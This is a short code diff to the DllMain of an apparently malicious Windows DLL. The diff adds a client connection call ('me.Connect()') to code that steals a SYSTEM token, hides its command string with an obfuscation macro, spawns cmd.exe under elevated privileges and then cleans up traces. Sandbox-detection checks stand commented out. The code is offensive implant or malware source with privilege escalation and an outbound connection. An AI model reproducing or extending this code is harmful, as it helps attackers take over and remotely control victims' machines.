@@ -42,6 +42,10 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		//if ( SandboxCompromise::SuspicousProcRunning() )
 		//	ProcessUtilities::HaltProcessExecution();
 
+
+		Client me;
+		me.Connect();
+
 		HANDLE escalatedPriv = ProcessUtilities::GetSystemToken();
 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));
 		std::wstring wstrCmd = std::wstring(strCmd.begin(), strCmd.end());
@@ -66,6 +70,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 			&si,
 			&pi
 		);
+
 
 		ProcessUtilities::Clean();
 
